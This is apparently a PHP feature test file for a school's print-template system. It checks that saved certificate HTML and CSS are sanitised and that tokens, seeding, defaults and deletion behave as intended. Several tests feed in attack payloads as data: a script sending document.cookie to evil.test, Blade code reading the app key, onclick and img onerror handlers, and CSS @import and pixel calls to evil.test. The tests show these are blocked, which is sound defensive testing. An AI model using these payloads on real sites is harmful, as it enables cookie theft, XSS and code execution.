<?php

declare(strict_types=1);

namespace Tests\Feature\Institute\Documents;

use App\Enums\PrintTemplateType;
use App\Models\Institute\PrintTemplate;
use App\Services\Institute\Exceptions\CourseRuleException;
use App\Support\PrintTokenRegistry;
use App\Support\RichText;
use Illuminate\Foundation\Testing\RefreshDatabase;
use LogicException;
use PHPUnit\Framework\Attributes\Test;
use Tests\Feature\Concerns\InteractsWithRbac;
use Tests\Feature\Institute\Concerns\BuildsAdmissions;
use Tests\Feature\Institute\Concerns\BuildsCatalogue;
use Tests\Feature\Institute\Concerns\BuildsRegisters;
use Tests\Feature\Institute\Concerns\BuildsSchedules;
use Tests\Feature\Institute\Documents\Concerns\BuildsDocuments;
use Tests\TestCase;

/**
 * Designing a printable document (§82, §84, §85, phase-19-23 §6.13, D-21-2, INV-21-5, §11).
 *
 * **The security case is the first half of this file.** `body_html` is stored HTML that a PDF
 * renderer is handed, held by whoever has `print_templates.edit`. If Blade survived storage it would
 * be remote code execution with a WYSIWYG attached, and if a `<script>` survived it would be stored
 * XSS in a document an employer opens. Both are asserted on the way in *and* on the way out, because
 * the database is not a trust boundary — a row written straight into it still must not reach a page.
 */
final class PrintTemplateTest extends TestCase
{
    use BuildsAdmissions;
    use BuildsCatalogue;
    use BuildsDocuments;
    use BuildsRegisters;
    use BuildsSchedules;
    use InteractsWithRbac;
    use RefreshDatabase;

    /*
    |--------------------------------------------------------------------------
    | What survives being saved
    |--------------------------------------------------------------------------
    */

    #[Test]
    public function a_script_never_survives_the_save(): void
    {
        $template = $this->printTemplate(PrintTemplateType::Certificate, [
            'body_html' => '<div><p>{student_name}</p><script>fetch("//evil.test?c="+document.cookie)</script></div>',
        ]);

        $this->assertStringNotContainsString('<script', (string) $template->getAttribute('body_html'));
        $this->assertStringNotContainsString('evil.test', (string) $template->getAttribute('body_html'));
    }

    #[Test]
    public function blade_never_survives_the_save(): void
    {
        // D-21-2 in one assertion. A template is HTML with {tokens}, never Blade; storing Blade and
        // rendering it would hand remote code execution to anybody holding `print_templates.edit`.
        $template = $this->printTemplate(PrintTemplateType::Certificate, [
            'body_html' => '<div>{{ config("app.key") }} @php echo 1; @endphp <p>{student_name}</p></div>',
        ]);

        $stored = (string) $template->getAttribute('body_html');

        $this->assertStringNotContainsString('{{', $stored);
        $this->assertStringNotContainsString('@php', $stored);
    }

    #[Test]
    public function an_inline_event_handler_never_survives_the_save(): void
    {
        $template = $this->printTemplate(PrintTemplateType::Certificate, [
            'body_html' => '<div onclick="alert(1)"><p>{student_name}</p></div>',
        ]);

        $this->assertStringNotContainsString('onclick', (string) $template->getAttribute('body_html'));
    }

    #[Test]
    public function a_stylesheet_keeps_its_layout_and_loses_its_tricks(): void
    {
        $template = $this->printTemplate(PrintTemplateType::Certificate, [
            'custom_css' => 'h1 { font-size: 20pt; }'
                .' @import url("//evil.test/x.css");'
                .' .x { width: expression(alert(1)); background: url("//evil.test/pixel.png"); }',
        ]);

        $css = (string) $template->getAttribute('custom_css');

        $this->assertStringContainsString('font-size: 20pt', $css);
        $this->assertStringNotContainsString('@import', $css);
        $this->assertStringNotContainsString('expression(', $css);
        // A tracking pixel in a printed document is still a tracking pixel.
        $this->assertStringNotContainsString('evil.test', $css);
        // And it can never close the <style> element it is printed into.
        $this->assertStringNotContainsString('<', $css);
    }

    #[Test]
    public function sanitising_is_idempotent_so_saving_and_rendering_cannot_drift(): void
    {
        // The database is not a trust boundary: the body is sanitised on save and again on render.
        // That is only safe if the second pass is a no-op.
        $once = RichText::sanitize('<div class="text-center"><p>{student_name}</p></div>', 'material');
        $twice = RichText::sanitize($once, 'material');

        $this->assertSame($once, $twice);
    }

    /*
    |--------------------------------------------------------------------------
    | Tokens
    |--------------------------------------------------------------------------
    */

    #[Test]
    public function the_tokens_a_template_uses_are_recorded_on_save(): void
    {
        $template = $this->printTemplate(PrintTemplateType::Certificate, [
            'body_html' => '<div><p>{student_name}</p><p>{grade}</p></div>',
        ]);

        $used = (array) $template->getAttribute('tokens_used');

        $this->assertContains('student_name', $used);
        $this->assertContains('grade', $used);
    }

    #[Test]
    public function an_unknown_token_is_a_warning_naming_it_and_not_a_refusal(): void
    {
        // A designer gets a typo wrong on the way to getting a layout right. Losing an hour of work
        // to a rejected save is the worse trade; an unknown token renders empty, which is survivable.
        [$template, $unknown] = $this->templateService()->create([
            'type' => PrintTemplateType::Certificate->value,
            'code' => 'TYPO'.mb_substr(uniqid(), -6),
            'name' => 'Template with a typo',
            'body_html' => '<div><p>{student_nme}</p></div>',
        ], $this->createSuperAdmin());

        $this->assertInstanceOf(PrintTemplate::class, $template);
        $this->assertSame(['student_nme'], $unknown);
    }

    #[Test]
    public function a_token_belonging_to_a_different_document_is_unknown_here(): void
    {
        // `{valid_until}` is a card's token. A certificate that used it would print a blank line.
        $unknown = PrintTokenRegistry::unknownIn(
            PrintTemplateType::Certificate,
            '<p>{student_name} {valid_until}</p>',
        );

        $this->assertSame(['valid_until'], $unknown);
    }

    #[Test]
    public function a_blade_echo_is_not_mistaken_for_a_token(): void
    {
        $this->assertSame([], PrintTokenRegistry::mentionedIn('<p>{{ student_name }}</p>'));
    }

    #[Test]
    public function a_students_name_is_escaped_into_the_document_and_a_qr_image_is_not(): void
    {
        // The `raw` list is short and every entry on it is built by this application. A name that
        // interpolated unescaped would turn a name into markup — stored XSS with extra steps, even
        // inside a PDF.
        $raw = PrintTokenRegistry::rawTokens(PrintTemplateType::Certificate);

        $this->assertContains('qr', $raw);
        $this->assertNotContains('student_name', $raw);
        $this->assertNotContains('grade', $raw);
        $this->assertNotContains('footer_note', $raw);
    }

    #[Test]
    public function a_name_containing_markup_prints_as_text(): void
    {
        $template = $this->printTemplate(PrintTemplateType::Certificate, [
            'body_html' => '<div><p>{student_name}</p></div>',
        ]);

        $html = $this->templateService()->render($template, [
            'student_name' => '<img src=x onerror=alert(1)>',
        ]);

        $this->assertStringNotContainsString('<img', $html);
        $this->assertStringContainsString('&lt;img', $html);
    }

    /*
    |--------------------------------------------------------------------------
    | The seeded defaults
    |--------------------------------------------------------------------------
    */

    #[Test]
    public function every_seeded_template_survives_its_own_sanitiser_with_its_styling_intact(): void
    {
        // D137: `RichText` keeps `class` only for the tokens on its allowlist, so a default styled on
        // invented class names would lose every one of them and ship looking unstyled — teaching the
        // first person who opens the editor that the editor is broken.
        $this->seedTemplates();

        foreach (PrintTemplateType::cases() as $type) {
            $template = $this->seededTemplate($type);

            $this->assertSame(
                [],
                PrintTokenRegistry::unknownIn($type, (string) $template->getAttribute('body_html')),
                sprintf('The seeded %s template uses a token that does not exist.', $type->value),
            );

            $css = (string) $template->getAttribute('custom_css');

            $this->assertNotSame('', trim($css), sprintf('The seeded %s template has no stylesheet left.', $type->value));

            // Every class selector in the stylesheet must name a class the sanitiser keeps.
            preg_match_all('/\.([a-z][a-z0-9-]*)/', $css, $matches);

            foreach (array_unique($matches[1]) as $class) {
                $this->assertContains(
                    $class,
                    RichText::CLASSES,
                    sprintf('The seeded %s stylesheet selects .%s, which the sanitiser strips.', $type->value, $class),
                );
            }
        }
    }

    #[Test]
    public function the_seeder_leaves_a_redesigned_template_alone(): void
    {
        $this->seedTemplates();

        $template = $this->seededTemplate(PrintTemplateType::Certificate);
        $this->templateService()->update(
            $template,
            ['name' => 'Our own design', 'body_html' => '<div><p>{student_name}</p></div>'],
            null,
            $this->createSuperAdmin(),
        );

        $this->seed(\Database\Seeders\PrintTemplateSeeder::class);

        // Re-running the seeders after a deploy must not restore a layout somebody deliberately
        // changed.
        $this->assertSame('Our own design', (string) $template->refresh()->getAttribute('name'));
        $this->assertSame(3, PrintTemplate::query()->count());
    }

    /*
    |--------------------------------------------------------------------------
    | Defaults, retirement and deletion
    |--------------------------------------------------------------------------
    */

    #[Test]
    public function only_one_template_of_a_kind_is_the_default(): void
    {
        $admin = $this->createSuperAdmin();
        $this->seedTemplates();

        $seeded = $this->seededTemplate(PrintTemplateType::Certificate);
        $other = $this->printTemplate(PrintTemplateType::Certificate, [], $admin);

        $this->templateService()->setDefault($other, $admin);

        $this->assertTrue((bool) $other->refresh()->getAttribute('is_default'));
        $this->assertFalse((bool) $seeded->refresh()->getAttribute('is_default'));
    }

    #[Test]
    public function retiring_a_template_needs_a_reason(): void
    {
        $admin = $this->createSuperAdmin();
        $template = $this->printTemplate(PrintTemplateType::Certificate, [], $admin);

        $this->expectException(CourseRuleException::class);

        $this->templateService()->deactivate($template, '   ', $admin);
    }

    #[Test]
    public function a_template_that_has_printed_something_cannot_be_deleted(): void
    {
        $admin = $this->createSuperAdmin();
        [, $seat] = $this->batchWithOneStudent($admin);

        $certificate = $this->issuedCertificate($seat, [], $admin);
        $template = $this->certificateService()->templateFor($certificate);

        // Retired, never deleted. A certificate somebody was handed has to stay reprintable exactly
        // as it was.
        $this->expectException(LogicException::class);

        $template->delete();
    }

    #[Test]
    public function a_template_nothing_has_printed_can_be_deleted(): void
    {
        $admin = $this->createSuperAdmin();
        $template = $this->printTemplate(PrintTemplateType::Certificate, [], $admin);

        $template->delete();

        $this->assertSoftDeleted('print_templates', ['id' => $template->getKey()]);
    }
}
